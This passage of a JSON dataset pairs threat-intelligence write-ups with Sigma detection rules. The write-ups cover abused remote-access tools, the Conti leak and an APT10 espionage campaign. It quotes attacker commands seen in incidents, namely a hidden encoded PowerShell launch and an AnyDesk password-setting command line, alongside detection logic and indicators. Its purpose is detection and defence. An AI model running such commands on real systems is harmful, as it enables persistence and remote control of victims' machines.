c:\\users\\[REDACTED]\\appdata\\roaming\\6bgh4ls\\client32.exe 252dce576f9fbb9aaa7114dd7150f320\n  b6b51f4273420c24ea7dc13ef4cc7615262ccbd6f6f5e5a49dae604ec153055ad\n  \n  File last wrote\n  c:\\users\\[REDACTED]\\appdata\\roaming\\6bgh4ls\\ctfmon.exe 252dce576f9fbb9aaa7114dd7150f320\n  b6b51f4273420c24ea7dc13ef4cc7615262ccbd6f6f5e5a49dae604ec153055ad\n```\n\nFinally, this instance of NetSupport makes network connections to a couple domains: first to `geo.netsupportsoftware.com`, which is used by the client to report back the client’s location, and second to a randomly named domain being used for its command and control (C2).\n\n```image\nAlt: remote access trojan detection\nDescription: The image displays a technical analysis of a suspicious outbound TCP network connection made by `ctfmon.exe`, indicating connections to two different domains: `geo.netsupportsoftware.com` and `asdujvuz.cn`. There are also details showing the potential creation of a file in a local directory. The text highlights that such network connections may suggest the presence of the NetSupport Manager RAT, providing key indicators of malicious behavior associated with this remote access tool.\nTranscription: |\n  Outbound tcp network connection by ctfmon.exe to\n  geo.netsupportsoftware[.]com (195.171.92[.]116:80)\n  \n  Network connections to netsupportsoftware.com indicate the presence of the NetSupport Manager RAT. This tool may be injected into other software during execution.\n  \n  File created\n  c:\\users\\[REDACTED]\\appdata\\local\\microsoft\\windows\\inetcache\\ie\\k18oclb5\\loca[1].htm\n  \n  Outbound tcp network connection by ctfmon.exe to\n  asdujvuz[.]cn (5.181.156[.]168:443)\n```\n\n---\n\n### Detection opportunity 1\n\nWe suggest writing, implementing, and testing the following rules within your EDR platform or SIEM:\n\n**NetSupport executing from unexpected directories:**\n\n```\ndescription = ‘netsupport client application’ & process_path != “program files”\n```\n\n**NetSupport renamed:**\n\n```\ninternal_name: client32.exe & process_name != client32.exe\n```\n\n**NetSupport making external network connections:**\n\n```\nAny external network connections to geo.netsupportsoftware.com (if you do not use NetSupport normally)\n```\n\n---\n\n## Remote Utilities\n\nRemote Utilities is a remote desktop suite known to the security community as “RURAT” when used in a malicious context. Execution from folders outside of “program files”—such as `appdata` or `programdata`—often indicates malicious use of Remote Utilities. If you do not use Remote Utilities within your environment, alert on the execution of `rutserv.exe` or `rfusclient.exe` on all hosts within your environment. In the wild, it has been abused by various ransomware groups such as Epsilon Red, TA505, and even some suspected state-sponsored adversaries.\n\nFrom a network alerting perspective, look for connections on ports 5655 and 5650, since they’re not usually used for anything other than remote utilities. For alerting on host execution behavior, refer to the detections below.\n\nIn this case, we saw the `rutserv` binary running from a folder in `AppData\\Roaming`.\n\n```image\nAlt: remote access trojan detection\nDescription: The image displays a threat detection report detailing the execution of a process related to Remote Utilities, specifically 'rutserv.exe'. It shows the full path of the executable, a unique identifier for the binary, and the command line parameters used. Additionally, it lists outbound TCP network connections made by 'rutserv.exe' to specific IP addresses and ports, indicating potential malicious activity associated with remote access tools.\nTranscription: |\n  Threat occurred\n  Process spawned\n  C:\\Users\\[REDACTED]\\AppData\\Roaming\\Remote Utilities Agent\\70020\\E66F4CA1A1\\rutserv.exe  6c6ba57be4b7b2fb661a99fea872f6b8\n  ce5ba1e5d70d95d52b89a1b8278ff8dd4d1e25c38c90ca202b43bdc014795d78\n  \n  Command Line: \"rutserv.exe\" –run_agent\n  \n  This binary has only been identified on this endpoint within the environment.\n  \n  Outbound tcp network connection by rutserv.exe to id70.remoteutilities[.]com (209.205.218[.]178:5655)\n  \n  Outbound tcp network connection by rutserv.exe to id70.remoteutilities[.]com (209.205.218[.]178:443)\n  \n  Outbound tcp network connection by rutserv.exe to 23.235.252[.]66:5655\n```\n\nIn another case, we saw the remote utilities binary being renamed and using a maliciously created service named `USBPrintManagerGrp` for persistence.\n\n```image\nAlt: remote access trojan detection\nDescription: The image displays a detailed alert regarding a potential Remote Access Trojan (RAT) incident. It shows a sequence of processes and commands associated with the execution of a malicious Remote Utilities application. Key points include a process spawned by 'svchost.exe' and its command line, which includes a reference to 'USBPrintManagerGrp' as a service name. Additionally, it lists suspicious file paths within the 'AppData' directory and an outbound TCP network connection attempt to an external IP address. The text highlights the identification of Remote Utilities masquerading as a print utility, indicating a malicious context.\nTranscription: |\n  Process spawned by services.exe\n  c:\\windows\\syswow64\\svchost.exe  d0abc231c0b3e88c612b28abb734d\n  388557172f87d67a033d7b8ea0124246af2e7c041e93fb35bb9cf733578b\n  \n  Command Line: C:\\Windows\\SysWOW64\\svchost.exe -k \"USBPrintManagerGrp\" s \"UniPrint.exe\"\n  \n  Threat occurred\n  Process spawned by svchost.exe\n  c:\\users\\[REDACTED]\\appdata\\roaming\\7zlib\\templates\\uniprint.exe  85b67377703bb2b9509d2fb895bb96d2afd42fe2e69f3d6c265f3a5e5c239598\n  \n  This is the Remote Utilities remote access utility, masquerading as a print utility.\n  \n  Outbound tcp network connection by uniprint.exe to\n  209.205.218[.]178:5655\n```\n\n---\n\n### Detection opportunity 2\n\nWe suggest writing, implementing, and testing the following rules within your EDR platform or SIEM:\n\n**Rutserv suspicious directory:**\n\n```\nProcess appears to be rutserv.exe or rfusclient.exe (or a renamed version of it) & path != program files\\remote utilities\n```\n\n**Rutserv renamed:**\n\n```\ndescription = Remote Utilities - Host & process_name != rutserv.exe or rfusclient.exe\n```\n\n**External network connection:**\n\n```\nAny external network connection to remoteutilities.com or ports 5655/5650 (if Remote Utilities is not normally used)\n```\n\n---\n\n## ScreenConnect\n\nThe ScreenConnect software (aka ConnectWise Control) has been leveraged in various cyber attacks since at least 2016. The application is feature-rich, allowing for remote management of hosts typically used for help desk support. Some notable features include drag-and-drop file transfers, screen recording, and access to the command line to execute custom commands.\n\nTypically, adversaries use ScreenConnect to deploy malicious payloads like Zeppelin and Sodinokibi ransomware to numerous hosts across victim environments. It has been linked to a sophisticated, suspected state-backed cyber espionage operation against foreign entities wherein the software was used to launch automated actions after installation. Additionally, ScreenConnect was pivotal in the attacks against Wipro back in 2019, when attackers used it to conduct gift card fraud.\n\nWhile we’re not fully aware of the technical aspects of these attacks, we can start to generate detection logic surrounding abnormal behavior. Start with a broad question: what can I expect from normal execution of ScreenConnect? This may be a tough question to answer in your environment, depending on whether or not the tool is approved for use. If it’s not approved, your pseudo-detection logic may be as simple as: *Detect whenever ScreenConnect executes*.\n\nBased on our own telemetry and intelligence gained from past incident response engagements, we’ve found that it is highly unusual for ScreenConnect or its child processes to write executable files to disk.\n\nWe detected ScreenConnect deploying ransomware to endpoints by writing and executing them directly to the temp directory commonly used by the application:\n\n```image\nAlt: remote access trojan detection\nDescription: The image displays a system alert indicating a threat event related to the ScreenConnect software. It provides specific details about the process that was spawned, including the file path and the command line used to execute it. The alert highlights that a process was initiated by `screenconnect.clientservice.exe`, referencing a specific executable (`executetech.exe`) along with a hash value, which is likely used for identifying the file's integrity or for threat analysis. This detailed technical information is pertinent for cyber threat detection and response.\nTranscription: |\n  Threat occurred\n  Process spawned by screenconnect.clientservice.exe\n  c:\\windows\\temp\\screenconnect\\6.9.22228.6977\\executetech.exe 8a6cf598c5084e903739d6e3a60cc7f319e192b196c986bd1434153f3d602f5763dc7f1d6ed76954b0a2e5dfcf71deee\n  \n  Command Line: \"C:\\Windows\\TEMP\\ScreenConnect\\6.9.22228.6977\\executetech.exe\"\n```\n\nScreenConnect allows users to enter custom commands to be executed within the context of a remote session. Whenever a user executes a command within the ScreenConnect command shell, it creates and executes a script file ending with `run.cmd` under the temp directory. An example of a commonly used file name and directory may look like the following:\n\n```\nC:\\WINDOWS\\TEMP\\ScreenConnect\\6.9.22228.6977\\1eb49efb-9375-4da2-a96c-5a935a1e2d42run.cmd\n```\n\nMore information about this execution chain can be found in this blog by the Morphisec team. The script file is eventually executed via `cmd.exe`.\n\nA practical detection rule could be based on identifying the following:\n\n- process command lines containing `ScreenConnect`\n- a command line including `run.cmd`\n- a child process writing a binary file to disk\n\nWe have observed initial payloads designed to drop ransomware families such as REvil/Sodinokibi via the following process chain:\n\n```image\nAlt: remote access trojan detection\nDescription: The image displays a detailed analysis of processes spawned by the ScreenConnect application, specifically highlighting malicious behavior linked to the execution of command scripts. It includes command lines showing how 'cmd.exe' is used to execute a script located in the Windows TEMP directory, alongside a visualization of the potential threat occurrence. The image also contains unique identifiers related to the processes and command executions, indicating an active threat detection scenario concerning remote access tools.\nTranscription: |\n  Process spawned by screenconnect.clientservice.exe\n  c:\\windows\\system32\\cmd.exe\n  d7ab69fad18d4a643d84a271dfc0dbdf ff79d3c4a0b7eb191783c323ab8363ebd1fd10be58d8bcc96b07067743ca81d5\n  \n  Command Line: \"cmd.exe\" /c \"C:\\WINDOWS\\TEMP\\ScreenConnect\\6.9.22228.6977\\1eb49efb-9375-4da2-a96c-5a935a1e2d42run.cmd\"\n  \n  Threat occurred\n  \n  Process spawned by cmd.exe\n  c:\\windows\\system32\\cmd.exe\n  d7ab69fad18d4a643d84a271dfc0dbdf ff79d3c4a0b7eb191783c323ab8363ebd1fd10be58d8bcc96b07067743ca81d5\n  \n  Command Line: cmd.exe /c START C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -e SQBmAcgAJBAFEA4VgA6FAAUgBPEMARQBtAFMAbwBSFAFQBAQBSAEUAIAAtAGMawbUuAHQYQBpAG4AcwAgACQBAEQAQNgA0CcAKQ7BAZAwB0AGEAcgB0ACABgPAw...\n```\n\n---\n\n### Detection opportunity 3\n\nWe suggest writing, implementing, and testing the following rules within your EDR platform or SIEM:\n\n**ScreenConnect suspect child lineage:**\n\n```\nParent_process = cmd.exe\nparent command line includes = run.cmd & screenconnect\nProcess = cmd.exe\nChildprocess = powershell.exe\n```\n\n**ScreenConnect writing binaries:**\n\n```\nScreenConnect writing binaries to C:\\Windows\\Temp\\screenconnect\\<Version Number>\\*\n```\n\n**ScreenConnect spawning binaries:**\n\n```\nScreenConnect spawning binaries from the following file path with many file modifications: C:\\Windows\\Temp\\screenconnect\\<Version Number>\\* (This may indicate successful ransomware execution).\n```\n\n---\n\n## Anydesk\n\nAnydesk markets itself as a cross-platform, fast, and secure remote desktop application capable of performing reliably under bandwidth constrained network connections. Due to its simplicity, Anydesk has recently become a de facto RMM tool used by attackers due to its lightweight footprint and ease of use for moving laterally.\n\nAnydesk is a popular tool for controlling victim machines and deploying ransomware payloads, more commonly seen with the following ransomware families: Blackheart, Sodinokibi/REvil, Netwalker, and Darkside. Attackers will typically drop instances of Anydesk to conspicuous paths not normally observed. Detecting abnormal Anydesk behavior can be fairly simple in most instances, since it has fairly predictable behavior when executed.\n\nUnder normal circumstances, Anydesk typically executes from these paths:\n\n- `C:\\Program Files (x86)\\anydesk\\anydesk.exe`\n- `C:\\Program Files\\anydesk\\anydesk.exe`\n- `C:\\Users\\<User>\\Downloads\\anydesk.exe`\n\nConversely, we’ve identified Anydesk being dropped in the following file paths during active ransomware incidents:\n\n- `C:\\Windows\\temp\\anydesk.exe`\n- `C:\\ProgramData\\anydesk.exe`\n- `C:\\ProgramData\\Adobe\\Setup\\AnyDesk.exe`\n\nOur first suggestion for defenders is to monitor your endpoints for relocated instances of Anydesk. Given that Anydesk may legitimately run from custom file paths, this may be an imperfect detection solution in some environments. However, you should still investigate and identify the origin from which Anydesk was written. If the activity turns out to be benign, standard tuning practice may apply.\n\nWhile investigating activity in compromised environments, we identified some anomalies in what files Anydesk writes to the filesystem. We created additional detection logic surrounding these anomalies, which revealed additional instances in other victim environments. Note that it’s highly abnormal for AnyDesk to write executable files to disk besides `gcapi.dll`, which is a legitimate DLL that’s part of the Google Chrome web browser used to interact with the Google Cloud API.\n\nWe also noticed that in legitimate use, setting custom session passwords via the command line is highly abnormal. We observed the following command during a suspected pre-ransomware engagement:\n\n```image\nAlt: remote access trojan detection\nDescription: The image displays a command line output showing the process spawned by 'mstsc.exe'. It includes a path indicating the execution of 'cmd.exe' from 'C:\\WINDOWS\\system32\\cmd.exe'. Additionally, it highlights a command line that involves executing 'C:\\ProgramData\\anydesk.exe' with the argument '--set-password'. This context is relevant as it illustrates a potential misbehavior associated with the Anydesk remote access tool, particularly in relation to setting a password in a suspicious manner.\nTranscription: |\n  Process spawned by mstsc.exe\n  c:\\windows\\system32\\cmd.exe  f58a3879a07f63bd0f74b022339555d4 f2c736c4b8a82858e06dffcb08b2d22d9d36a7ff92fa2812fc14d16234e10\n  \n  Command line:  C:\\WINDOWS\\system32\\cmd.exe /C cmd.exe /c echo | C:\\ProgramData\\anydesk.exe --set-password\n```\n\n---\n\n### Detection opportunity 4\n\nWe suggest writing, implementing, and testing the following rules within your EDR platform or SIEM:\n\n**Suspicious process lineage:**\n\n```\nParent_process: cmd.exe & process: anydesk\n```\n\n**Relocated AnyDesk execution:**\n\n```\nAnyDesk executing from a process_path != C:\\Program Files (x86)\\anydesk\\anydesk.exe or C:\\Program Files\\anydesk\\anydesk.exe or C:\\Users\\<User>\\Downloads\\anydesk.exe\n```\n\n**AnyDesk writing binaries:**\n\n```\nAnyDesk writing any files not named gcapi.dll\n```\n\n**cmd piping a password into an Anydesk session via cli:**\n\n```\nC:\\WINDOWS\\system32\\cmd.exe /C cmd.exe /c echo J9kzQ2Y0qO |C:\\ProgramData\\anydesk.exe --set-password\n```\n\n---\n\nAs an added bonus, you may have noticed that the Windows RDP client (`mstsc.exe`) spawned this instance of `cmd.exe`, which led to Anydesk execution. This may be detectable on its own with the following bonus analytic, although this may also require tuning or generate high levels of false positives in certain environments!\n\n---\n\n### Bonus detection opportunity\n\n**Suspicious process lineage:**\n\n```\nParent_process = Mstsc.exe & process = cmd.exe & child_process = cmd.exe\nParent_process = Mstsc.exe & process = powershell.exe & child_process = net.exe\nParent_process = Mstsc.exe & process = powershell.exe & child_process = reg.exe\nParent_process = Mstsc.exe & process = powershell.exe & child_proces = schtasks.exe\n```\n\n---\n\nWe hope this blog has been helpful in demystifying some aspects of detecting abnormal usage of commonly abused RMM tools. Along with NetSupport, Remote Utilities, ScreenConnect, and Anydesk, we have observed ransomware operators using the following additional RMM tools over the years:\n\n- Splashtop\n- Atera\n- LogMeIn\n- TeamViewer\n- Pulseway\n- RemotePC\n- Webroot SecureAnywhere\n- PCAnywhere\n- Kaseya\n- GoToMyPC\n\nThe detection logic above may be applicable to these tools as well.\n\nAs always, keep in mind that each detection strategy presented in this post is not perfect and will likely require extensive tuning on your part. This detection guidance wouldn’t be possible without the great analysis and reporting being performed by researchers across the industry each and every day. So keep on fighting the good fight; we’re all in this together.",
    "sigma_rule": {
      "title": "Remote Access Tool Services Have Been Installed - Security",
      "id": "c8b00925-926c-47e3-beea-298fd563728e",
      "related": [
        {
          "id": "1a31b18a-f00c-4061-9900-f735b96c99fc",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects service installation of different remote access tools software. These software are often abused by threat actors to perform",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/"
      ],
      "author": "Connor Martin, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-12-23",
      "modified": "2024-12-07",
      "tags": [
        "attack.persistence",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697"
      },
      "detection": {
        "selection": {
          "EventID": 4697,
          "ServiceName|contains": [
            "AmmyyAdmin",
            "AnyDesk",
            "Atera",
            "BASupportExpressSrvcUpdater",
            "BASupportExpressStandaloneService",
            "chromoting",
            "GoToAssist",
            "GoToMyPC",
            "jumpcloud",
            "LMIGuardianSvc",
            "LogMeIn",
            "monblanking",
            "Parsec",
            "RManService",
            "RPCPerformanceService",
            "RPCService",
            "SplashtopRemoteService",
            "SSUService",
            "TeamViewer",
            "TightVNC",
            "vncserver",
            "Zoho"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "The rule doesn't look for anything suspicious so false positives are expected. If you use one of the tools mentioned, comment it out"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_service_install_remote_access_software.yml"
  },
  "37": {
    "url": "https://twitter.com/vxunderground/status/1423336151860002816",
    "markdown": "# Post\n\nAug 5, 2021\n\nA \"pentester\" for Conti has leaked \"pentester manuals and software\" online. These files are allegedly given to affiliates\n\nvxug.fakedoma[.]in/tmp/\n\n- Link modified, Twitters banned our domains\n- Some files password protected, we do not know the password\n- Images from XSS\n\n```image\nAlt: Image 1\nDescription: The image displays a group of screenshots that seem to be part of a communication or discussion regarding penetration testing related to the Conti ransomware group. The screenshots include dialogues and messages that refer to connections to specific servers, password prompts, and operational details associated with the Conti group. The context suggests there is a discussion about the validity and practices of recruitment for penetration testing roles within this framework. The text appears to be in Russian, further indicating a focus on the cybersecurity landscape involving the Conti ransomware.\nTranscription: |\n  Тупой развод а не работа. Пентестеры они набирают, да конечно... Собирают ребят для отработки сетей Active Directory, Локер знают - Conti. Сливаю вам их ip-адрес серверов кобальта и типа материалов обучения. 1500$ да конечно набирают лохов и делают между собой деньги, а пачком кормят тем что дадут знать когда жертва заплатит. Админ в теле был - Tokyo, его жаба - cicada3301@strong.pm. Знайте подорса в лям! Куда нужно я уже отправлял данные поэтому пусть меняет данные сервера и все остальное. А для работы сбрасываю все материалы по обучению =)\n  \n  All good\n  \n  Их вот в Торе - bk7aar425fnn4x6se4gby7rijv24z3hqwfkbhy5onv7yq2obja5.onion\n  Тот кто набирает на тип работы Пентестеров 😅😅😅😅😅\n  \n  Attachments\n  - Снимок.PNG\n  - 7777.PNG\n  - 222.PNG\n```\n\n```image\nAlt: Image 2\nDescription: The image depicts a screenshot of the Cobalt Strike application interface. It shows a connection dialog with fields for Host, Port, User, and Password. The highlighted section includes various IP addresses and a username, suggesting that this is a setup for connecting to a Cobalt Strike team server. The event log at the bottom lists payloads and their corresponding hosts, indicating active connections. This image provides valuable technical information related to penetration testing tools used in cybersecurity.\nTranscription: |\n  Cobalt Strike\n  \n  Connect\n  This is the connect dialog. You should use it to connect to a Cobalt Strike (Aggressor) team server.\n  \n  Host:\n    82.118.21.1\n    85.93.88.165\n    185.141.63.120\n    162.244.80.235\n  \n  Port: 56161\n  User: Hookah\n  Password: **************\n  \n  Event Log\n  name          payload          host                  port\n  Hookah@82.118.21.1  Hookah@185.141.63.120  Hookah@162.244.80.235\n```\n\n```image\nAlt: Image 3\nDescription: The image shows a connect dialog for a Cobalt Strike (Aggressor) team server. It includes fields for entering a host IP address, port number, user name, and password. The host IP listed is 162.244.80.235 and the port number is 58879. The user field contains 'Hookah' while the password field is obscured with asterisks. The image also has the watermark 'XSS.js' in the background.\nTranscription: |\n  Connect\n  \n  New Profile\n  162.244.80.235\n  85.93.88.165\n  185.141.63.120\n  82.118.21.1\n  \n  This is the connect dialog. You should use it to connect to a Cobalt Strike (Aggressor) team server.\n  \n  Host: 162.244.80.235\n  Port: 58879\n  User: Hookah\n  Password: ****************\n```\n\n```image\nAlt: Image 4\nDescription: The image displays a connection dialog for a software tool called Cobalt Strike (Aggressor), featuring fields for entering connection details. It includes the host IP address '185.141.63.120', port number '47734', a username 'Hookah', and a placeholder for a password. The interface is designed for users to connect to a server, and the background includes a watermark indicating an association with XSS (Cross-Site Scripting). The overall layout suggests it is a screenshot taken from the software interface.\nTranscription: |\n  Connect\n  \n  New Profile\n  162.244.80.235\n  85.93.88.165\n  185.141.63.120\n  82.118.21.1\n  \n  This is the connect dialog. You should use it to connect to a Cobalt Strike (Aggressor) team server.\n  \n  Host: 185.141.63.120\n  Port: 47734\n  User: Hookah\n  Password: ****************\n```\n\n## Comment\n\nAug 5, 2021\n\n🧐☠️\n\n```image\nDescription: The image displays a forum post by a user named \"m1Geelka\" labeled as \"HDD-drive\" under the user category. The user's avatar is a default \"NO AVATAR\" image. The post details include the user's join date of April 29, 2020, a message count of 36, and a reaction score of 4. The content of the post contains a link to a SendSpace URL for downloading \"Manuals and software,\" with the URL partially censored for privacy.\nTranscription: |\n  Here's the transcription:\n  **m1Geelka**  \n  HDD-drive User  \n  Joined: Apr 29, 2020  \n  Messages: 36  \n  Reaction score: 4  \n  \n  Today at 7:18 AM  \n  Manuals and software - [https://www.sendspace.com/file/******_pass=******](#)  \n  Report\n```\n\n### Comment\n\nAug 5, 2021\n\nYes. This is the file we are sharing. However, some content within it are also password protected and the password is not as displayed.",
    "sigma_rule": {
      "title": "Esentutl Gather Credentials",
      "id": "7df1713a-1a5b-4a4b-a071-dc83b144a101",
      "status": "test",
      "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.",
      "references": [
        "https://twitter.com/vxunderground/status/1423336151860002816",
        "https://attack.mitre.org/software/S0404/",
        "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/"
      ],
      "author": "sam0x90",
      "date": "2021-08-06",
      "modified": "2022-10-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "esentutl",
            " /p"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "User",
        "CommandLine",
        "ParentCommandLine",
        "CurrentDirectory"
      ],
      "falsepositives": [
        "To be determined"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_esentutl_params.yml"
  },
  "38": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage",
    "markdown": "# Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign\n\n**Posted:** 17 Nov, 2020\n**Category:** Threat Intelligence\n\n---\n\n## Evidence that advanced persistent threat group Cicada is behind attack campaign targeting companies in 17 regions and multiple sectors.\n\nA large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation.\n\nCompanies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sectors, as well as managed service providers (MSPs).\n\nThe scale and sophistication of this attack campaign indicate that it is the work of a large and well-resourced group, with Symantec, a division of Broadcom (NASDAQ: AVGO), discovering enough evidence to attribute it to Cicada (aka APT10, Stone Panda, Cloud Hopper). Cicada has been involved in espionage-type operations since 2009, and U.S. government officials have linked the activities of APT10, which we track as Cicada, to the Chinese government.\n\nCicada has historically been known to target Japan-linked organizations and has also targeted MSPs in the past. The group is using living-off-the-land tools as well as custom malware in this attack campaign, including a custom malware - Backdoor.Hartip - that Symantec has not seen being used by the group before. Among the machines compromised during this attack campaign were domain controllers and file servers, and there was evidence of files being exfiltrated from some of the compromised machines.\n\nThe attackers extensively use DLL side-loading in this campaign and were also seen leveraging the ZeroLogon vulnerability that was patched in August 2020.\n\n---\n\n## How was this campaign discovered?\n\nThis campaign was first discovered by Symantec when suspicious DLL side-loading activity on one of our customer’s networks triggered an alert in our Cloud Analytics technology, which is available in Symantec Endpoint Security Complete (SESC). This activity was then reviewed by our Threat Hunter analysts before being passed on to our investigations team for further analysis.\n\nCloud Analytics leverages artificial intelligence to comb through Symantec’s vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. The initial Cloud Analytics alert allowed our threat hunting team to identify further victims of this activity, build a more complete picture of this campaign, and attribute this activity to Cicada. It also allowed us to update and create new protections to ensure our customers are protected from this activity.\n\n---\n\n## Victims\n\nThis campaign has been ongoing since at least mid-October 2019, right up to the beginning of October 2020, with the attack group active on the networks of some of its victims for close to a year. The campaign is very wide-ranging, with victims in a large number of regions worldwide.\n\n```image\nAlt: Figure 1. Locations of some of the companies targeted in this campaign; most of those targeted have links to Japan or Japanese organizations\nDescription: The image is a map showing the locations of companies targeted by the Cicada attack campaign, with specific countries highlighted in red. The map indicates various regions, including the United States, China, Japan, and several countries in Europe and Asia. Accompanying the map is a title 'Cicada Victim Locations' and branding from Symantec, a division of Broadcom. The regions highlighted suggest a strong focus on areas linked to Japan or Japanese organizations.\nTranscription: |\n  **Cicada Victim Locations**\n  \n  - United States\n  - Mexico\n  - Canada\n  - United Kingdom\n  - Belgium\n  - France\n  - Germany\n  - China\n  - India\n  - Hong Kong\n  - Taiwan\n  - Philippines\n  - Vietnam\n  - Thailand\n  - Singapore\n  - United Arab Emirates\n  - South Korea\n```\n\nThe companies hit are, in the main, large, well-known organizations, many of which have links to Japan or Japanese companies, which is one of the main factors tying the victims together. Cicada has been known to have a strong focus on Japanese organizations in previous attack campaigns. As is clear from the map in *Figure 1*, South and East Asia are strong areas of focus for the attackers in this campaign. It is unusual to see a reportedly Chinese-government-linked group attacking companies within China’s borders but, like many of the companies targeted in this campaign, the target in that instance is a subsidiary of a Japanese organization.\n\nWe also saw similar loaders on all the victim networks. These are among the main factors linking these victims together, with all of them coming from a wide variety of sectors, including:\n\n- Automotive\n- Clothing\n- Conglomerates\n- Electronics\n- Engineering\n- General Trading Company\n- Government\n- Industrial Products\n- Managed Service Providers\n- Manufacturing\n- Pharmaceutical\n- Professional Services\n\nThe amount of time the attackers spent on the networks of victims varied, with the attackers spending a significant amount of time on the networks of some victims, while spending just days on other victim networks. In some cases, too, the attackers spent some time on a network but then the activity would cease, but start again some months later.\n\n---\n\n## Tactics, tools, and procedures\n\nWe observed the attackers using a wide variety of living-off-the-land, dual-use, and publicly available tools and techniques in these attacks, including:\n\n- Network Reconnaissance – gathering information from machines on the network.\n- Credential Theft – stealing user names and passwords, potentially to provide them with further access to the victim network.\n- RAR archiving – files are transferred to staging servers before exfiltration. They may be encrypted or compressed, to make them easier to extract.\n- Certutil – a command-line utility that can be exploited and used for various malicious purposes.\n- Adfind – a command-line tool that can be used to perform Active Directory queries.\n- Csvde – can be used to extract Active Directory files and data.\n- Ntdsutil) – can be used as a credential-dumping tool.\n- WMIExec – can be used for lateral movement and to execute commands remotely.\n- PowerShell – a powerful interactive command-line interface and scripting environment included in the Windows operating system.\n\nThe threat actors also use a legitimate cloud file-hosting service for exfiltration.\n\nThe attackers also use DLL side-loading at multiple stages during the attack, including using it to load Backdoor.Hartip. DLL side-loading occurs when attackers are able to replace a legitimate library with a malicious one, allowing them to load malware into legitimate processes. Attackers use DLL side-loading to try and hide their activity by making it look legitimate, and it also helps them avoid detection by security software.\n\nThe attackers were also seen deploying a tool capable of exploiting the ZeroLogon vulnerability (CVE-2020-1472).\n\n---\n\n## Links to Cicada\n\nThe scale and sophistication of this attack campaign indicate that it is the work of a large and well-resourced group, such as a nation-state actor, with Symantec discovering enough evidence to attribute it with medium confidence to Cicada.\n\nSymantec analysts have linked this activity to Cicada due to the use of previously seen obfuscation techniques and shellcode on loader DLLs.\n\nActivity seen in one of the victim organizations has various trait similarities with previously seen Cicada activity that was described in a blog by Cylance in 2019, including:\n\n- Third-stage DLL has an export named \"FuckYouAnti\"\n- Third-stage DLL uses CppHostCLR technique to inject and execute the .NET loader assembly\n- .NET Loader is obfuscated with ConfuserEx v1.0.0\n- Final payload is QuasarRAT – an open-source backdoor used by Cicada in the past\n\nIn another affected organization, the loaders deploying Backdoor.Hartip overlap in the obfuscation and shellcode used, making us confident it is the same actor in both organizations.\n\n**Similarities between activity in both organizations:**\n\n- Side-loading DLL\n- C++ usage\n- API call sequence\n- GetModuleFileName -> lstrcat -> CreateFile -> ReadFile\n- Load next-stage payload from another file\n- Obfuscation: lots of garbage OutputDebugString, _time64, srand, rand API calls\n\n```image\nAlt: Figure 2. Image showing links between Cicada and two victim organizations in this campaign\nDescription: The image is a detailed diagram illustrating the links between the Cicada threat actor and two victim organizations, labeled 'Organisation A' and 'Organisation B'. It shows a flowchart that connects various components of the attack, including DLLs, obfuscation techniques, and payloads used in the campaign. Key elements include 'Cicada', 'CppHostCLR', '.NET Loader (ConfuserE)', and the final payloads such as 'Quasar' and 'Backdoor.Hartip'. Each node in the chart is associated with specific technical indicators and behaviors related to the attack.\nTranscription: |\n  Cicada Victim Links\n  \n  Cicada\n      └── threatvector.cylance.com\n          ├── CPPHostCLR\n          ├── FuckYouAnti\n          ├── .NET Loader (ConfuserEx)\n          │   ├── 578ea267b943d976365 ...\n          │   └── 8b5d347e048e31cdb ...\n          │       └── Quasar\n          │           └── 45.67.230.134\n          └── altapt10_quasar_loader_aggress ...\n              └── safari.browser.install\n  \n  Organisation A\n      └── d5e38a1c760e707f ...\n          ├── c1f3e1b6017b219e ...\n          │   └── Obfuscation\n          │       └── 3f5b62322c75d9502 ...\n          └── 03b1588caabdb509e ...\n  \n  Organisation B\n      └── cdec58a5731bb8c1 ...\n          ├── Shellcode\n          │   └── 4a0e80eb14eb54bce ...\n          └── ea99d9de91392803 ...\n              └── Backdoor.Hartip\n                  └── 213.252.246.245\n```\n\nThese similarities leave us confident that this is the same group carrying out this activity in both organizations, and that this group is Cicada.\n\n---\n\n## Conclusion\n\nJapan-linked organizations need to be on alert as it is clear they are a key target of this sophisticated and well-resourced group, with the automotive industry seemingly a key target in this attack campaign. However, with the wide range of industries targeted by these attacks, Japanese organizations in all sectors need to be aware that they are at risk of this kind of activity.\n\nCicada clearly still has access to a lot of resources and skills to allow it to carry out a sophisticated and wide-ranging campaign like this, so the group remains highly dangerous. Its use of a tool to exploit the recently disclosed ZeroLogon vulnerability and a custom backdoor that has not been observed by Symantec before show that it continues to evolve its tools and tactics to actively target its victims.\n\nThe group’s use of techniques such as DLL side-loading and a wide array of living-off-the-land tools underline the need for organizations to have a comprehensive security solution in place to detect this kind of suspicious activity before actors like Cicada have the chance to deploy malware or steal information from their networks.\n\n---\n\n## Protection/Mitigation\n\nThis activity was first discovered thanks to an alert triggered by our Cloud Analytics technology, which is available in Symantec Endpoint Security Complete (SESC).\n\n---\n\n## Indicators of Compromise (IoCs)\n\n**File Hashes:**\n\n- 